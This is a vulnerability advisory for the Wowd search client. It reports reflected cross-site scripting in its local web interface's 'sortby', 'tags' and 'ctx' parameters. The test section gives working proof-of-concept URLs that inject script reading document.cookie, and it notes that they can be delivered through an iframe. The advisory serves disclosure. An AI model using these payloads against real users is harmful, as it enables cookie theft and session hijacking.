What is Wowd?
################

Wowd is a real-time search engine for discovering
what's popular on the web right now.

In essence, the company has made a peer-to-peer
search engine powered by what other Wowd users
are looking at online rather than studying and
ranking sites based on an arcane link structure.
Taking search and breaking it into millions of
tiny pieces all run by individual users who have
downloaded the Wowd client completely changes
the operation -- and economics -- of a search
engine. The more times that someone in the Wowd
crowd clicks on a link within a recent time
frame, the higher the link's ranking.

Vulnerability description
##########################

Wowd client contains a flaw that allows a remote
cross site scripting attack.This flaw exists because
the application does not validate In the URI dialog
'sortby' 'tags' and 'ctx' variables upon submision to
'index.html' script. This could allow a user to create
a specially crafted URL that would execute arbitrary
code in a user's browser within the trust relationship
between the browser and the server,leading loss of integrity.

This issue can be dangerous , because if you are running
Wowd client , you have all of this vulnerabilities because
this issue can be exploited accross all browsers,
include ie8 with the XSS filter ( WoW ! )

#############
Test
#############

I test it in ie8, firefox 3.5.3 and safari 4

in all cases the xss is executed include ie8 with xss filter :D

a remote user can compose a html document
with a iframe and this source for the iframe:

http://localhost:8101/wowd/index.html?search&sortby=rank%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E

the browser executes the xss ,if you access directly to
this url the xss is executed too.

aditionaly wen wowd show his results , we have a functionality
to add "tags" to a url.

Example:

http://localhost:8101/wowd/index.html?search&query=a&
sortby=rank&tags=english|S0B0707656E676C6973680D02

this shows a indexed search with tag 'english' we can add a
crafted tag that allow to execute a xss like:[tag]|[token]

example:

http://localhost:8101/wowd/index.html?search&query=a
&sortby=rank&tags=english|S0B0707656E676C6973680D02,
%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E|S0B0707656E676C6973680D02

and it executed the xss in the tags labels.

ctx variable is also afected too

http://localhost:8101/wowd/index.html?search&page=2&q=
&sortby=rank&tags=news|S0807046E6577730D02&ctx=1995393737681%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E
